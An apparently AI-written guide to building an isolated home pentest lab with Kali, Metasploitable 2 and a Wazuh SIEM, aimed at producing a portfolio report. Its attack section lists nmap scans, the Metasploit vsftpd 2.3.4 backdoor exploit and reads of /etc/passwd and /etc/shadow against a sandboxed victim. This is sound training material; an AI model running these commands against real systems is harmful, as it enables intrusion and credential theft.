# Home Security Lab — Attacker vs. Victim Setup Guide

> **Legal / safety rule #1:** Everything in this lab stays on an *isolated* virtual network. You only ever attack machines **you own, inside this sandbox**. Never point these tools at a device, website, or network you don't own or have written permission to test.

Built for: AMD Ryzen 5 7500F (6c/12t), 16 GB RAM, plenty of disk. More than enough for this lab.

---

## 0. The topology (what you're building)

```
  Your Windows 11 PC
  └── VirtualBox
      │
      │   [ Host-Only / Internal network: 10.0.0.0/24 — SEALED, no internet ]
      │
      ├── Kali Linux        10.0.0.10   (ATTACKER)
      ├── Metasploitable 2  10.0.0.20   (VICTIM #1 - Linux)
      ├── (optional) Windows 10 eval  10.0.0.30  (VICTIM #2)
      └── (optional) SIEM VM 10.0.0.50 (Wazuh / Security Onion - the "defender")
```

**RAM budget while running (16 GB total):**
- Windows host: ~5 GB
- Kali: 4 GB
- Metasploitable: 1 GB
- SIEM VM (if added): 4 GB

→ Run Kali + Metasploitable together comfortably. Add the SIEM VM when you want the "blue team" side, and close other apps first. (A full Security Onion wants 8 GB+ on its own, so for 16 GB total, prefer **Wazuh** for the SIEM — it's lighter.)

---

## 1. Install the hypervisor

1. Download **VirtualBox** (free): https://www.virtualbox.org/wiki/Downloads → "Windows hosts"
2. Also grab the **VirtualBox Extension Pack** (same page) — install it after VirtualBox.
3. Install with defaults. Reboot if asked.

> **Performance note for YOUR machine:** your PC has Windows' Virtualization-Based Security (VBS/Hyper-V) running. VirtualBox still works, just in a slower mode. Start the lab as-is. *Only* if VMs feel sluggish, disable Hyper-V later (ask me and I'll give you the exact commands).

---

## 2. Build the ATTACKER — Kali Linux

Kali comes pre-packaged for VirtualBox, so there's no manual OS install.

1. Go to https://www.kali.org/get-kali/ → **Virtual Machines** → download the **VirtualBox 64-bit** image (a `.7z` file).
2. Extract it (7-Zip). You get a `.vbox` + `.vdi`.
3. In VirtualBox: **File → Import Appliance** (or just double-click the `.vbox`).
4. Settings → **System → Base Memory: 4096 MB**, **Processors: 2**.
5. Default login for the prebuilt image: `kali` / `kali`.

---

## 3. Build the VICTIM — Metasploitable 2

A deliberately vulnerable Linux box, purpose-built for practice.

1. Download from SourceForge: https://sourceforge.net/projects/metasploitable/
2. Unzip → you get a `.vmdk` (virtual disk).
3. In VirtualBox: **New** →
   - Name: `Metasploitable2`, Type: Linux, Version: Other Linux (64-bit)
   - Memory: **1024 MB**
   - Hard disk: **Use an existing virtual hard disk file** → pick the `.vmdk`
4. Create. Default login: `msfadmin` / `msfadmin`.

*(Optional Windows victim later: Microsoft gives free 90-day Win10/11 eval VMs at https://developer.microsoft.com/windows/downloads/virtual-machines/ )*

---

## 4. Build the isolated network (the critical safety step)

Do this for **every** VM so nothing can escape to the internet or your home network.

**Option A — Host-Only (recommended; your Kali can still reach the SIEM/host tools):**
1. VirtualBox → **Tools → Network → Host-only Networks → Create**. Note the name (e.g. `VirtualBox Host-Only Ethernet Adapter`).
2. For each VM: **Settings → Network → Adapter 1 → Attached to: Host-only Adapter**.

**Option B — Internal Network (most sealed; VMs see only each other):**
- **Settings → Network → Adapter 1 → Attached to: Internal Network**, name it `lab`.

Then set static IPs so addresses don't change:
- **Kali:** `sudo ip addr add 10.0.0.10/24 dev eth0` (or set it in the GUI network settings)
- **Metasploitable:** log in, then `sudo ifconfig eth0 10.0.0.20 netmask 255.255.255.0`

**Verify isolation:** from Kali, `ping 10.0.0.20` should work; `ping 8.8.8.8` should **fail**. If the internet ping fails, your sandbox is sealed correctly. ✅

---

## 5. THE ATTACK — a full kill-chain you can write up

This mirrors how a real engagement flows. Do each phase, and screenshot as you go (see §6).

### Phase 1 — Reconnaissance / Scanning
From Kali:
```bash
# Host discovery
nmap -sn 10.0.0.0/24

# Service + version detection on the victim
nmap -sV -sC -p- 10.0.0.20
```
**Look for:** open ports and *old* service versions (e.g. vsftpd 2.3.4, UnrealIRCd, Samba, a weak Apache/PHP). Note them.

### Phase 2 — Enumeration
Dig into one service. Example for the web app:
```bash
# Directory brute force
dirb http://10.0.0.20/
# Metasploitable hosts DVWA and Mutillidae — great for web-attack practice
```

### Phase 3 — Exploitation (Metasploit)
```bash
msfconsole
search vsftpd 2.3.4
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.0.0.20
exploit
```
If it lands, you get a shell on the victim. Run `whoami`, `id`, `hostname` to prove access.

### Phase 4 — Post-exploitation
```bash
# Prove impact: read sensitive files
cat /etc/passwd
cat /etc/shadow
# Enumerate for privilege escalation, pull a trophy file, etc.
```

### Phase 5 — Remediation (the part that gets you hired)
For each finding, write **how a defender would fix it**: patch/upgrade the service, disable it, firewall the port, enforce strong auth, etc. Blue-team thinking on a red-team lab is exactly what entry-level hiring managers want.

---

## 6. What to REPORT (this is the resume gold, not the hacking)

The lab itself isn't the portfolio piece — **your write-up is.** Keep a report (Markdown in a GitHub repo, or a PDF) with these sections. This is literally how professional pentest reports are structured:

1. **Executive Summary** — 3–4 plain-English sentences a non-technical manager could read. "I built an isolated lab and demonstrated how an attacker could fully compromise an unpatched Linux server via an outdated FTP service."
2. **Scope & Environment** — the topology diagram, VM list, IPs, tools used, dates.
3. **Methodology** — the 5 phases above (recon → exploit → post-exploit). Name the framework you're loosely following (e.g. the **Cyber Kill Chain** or **MITRE ATT&CK** — mapping steps to ATT&CK technique IDs like `T1046 Network Service Discovery` looks *very* sharp).
4. **Findings** — one entry per vulnerability:
   - Title + severity (Critical/High/Med/Low)
   - Affected host/service + version
   - **Screenshot** of the exploit working
   - The exact commands you ran (so it's reproducible)
   - Impact ("attacker gained root and read /etc/shadow")
   - **Remediation** (how to fix)
5. **Detection & Monitoring** — what the attack looked like from the defender's side in your SIEM (see §7). Screenshot the alerts.
6. **Lessons learned / conclusion.**

**Screenshot discipline:** capture every meaningful step — the nmap results, the exploit launching, the shell prompt, the trophy file, and the SIEM alert. Annotate them.

---

## 7. The SIEM — adding the "blue team" / defender side

A SIEM (Security Information and Event Management) collects logs and raises alerts. Adding one turns your lab from "I hacked a box" into "I attacked **and detected** the attack" — which is a huge resume differentiator because most beginners skip it.

### Which SIEM to use

| SIEM | Best for | RAM | Notes |
|------|----------|-----|-------|
| **Wazuh** ⭐ | **Your 16 GB setup** | ~4 GB | Free, open-source, hugely popular in job postings. Does HIDS + log analysis + alerting. Easiest to run alongside your other VMs. **Start here.** |
| **Splunk Free** | Learning the #1 enterprise tool | ~2–4 GB | Free tier (500 MB/day). "Splunk" on a resume is a keyword magnet. Great #2 choice. |
| **Security Onion** | Full network detection (IDS + SIEM) | 8–16 GB | Powerful but heavy — wants its own beefy VM. Save for when you upgrade RAM. |
| **Elastic / ELK** | Flexibility | ~6 GB+ | More DIY. |

**My pick for you: Wazuh now, add Splunk Free later.** Both are names recruiters search for.

### How it fits in
1. Create a small Linux VM (Ubuntu Server, 4 GB RAM) on the same `10.0.0.0/24` network → `10.0.0.50`.
2. Install the **Wazuh all-in-one** (manager + dashboard) on it: https://documentation.wazuh.com/ (single-command installer).
3. Install the **Wazuh agent** on your victim(s) so their logs flow to the SIEM.
4. Now when you run the attack from §5, watch the Wazuh dashboard — you'll see:
   - Authentication failures / brute-force alerts
   - Suspicious process execution
   - File integrity changes
5. Screenshot those alerts for the **Detection & Monitoring** section of your report.

### Resume bump
> *Deployed a Wazuh SIEM to centralize host logs; detected and triaged simulated attacks (brute-force, exploitation, privilege escalation) and mapped observed activity to MITRE ATT&CK techniques.*

---

## 8. Suggested resume bullets

> *Built an isolated virtualization lab (VirtualBox) with Kali Linux attacker and vulnerable Linux/Windows targets on a segmented host-only network.*

> *Executed full attack kill-chain — reconnaissance (Nmap), exploitation (Metasploit), and post-exploitation — and documented findings in a professional pentest-style report with remediation guidance.*

> *Deployed a Wazuh SIEM for the defensive side; detected the simulated attacks and mapped activity to the MITRE ATT&CK framework.*

---

## 9. Where to grow next
- Add a Windows victim + practice Active Directory attacks (GOAD / "Game of Active Directory").
- Try **TryHackMe** and **Hack The Box** (hosted labs — same skills, no setup).
- Learn **Wireshark** to analyze the attack traffic on the wire.
- Publish your report as a **GitHub repo** and link it on your resume/LinkedIn.

---

### Quick-start checklist
- [ ] Install VirtualBox + Extension Pack
- [ ] Import Kali (4 GB / 2 CPU)
- [ ] Add Metasploitable 2 (1 GB)
- [ ] Set both to Host-Only / Internal network, static IPs
- [ ] Verify isolation (can ping each other, can't reach internet)
- [ ] Run nmap → exploit → post-exploit
- [ ] Stand up Wazuh SIEM, install agent on victim
- [ ] Screenshot everything, write the report, push to GitHub
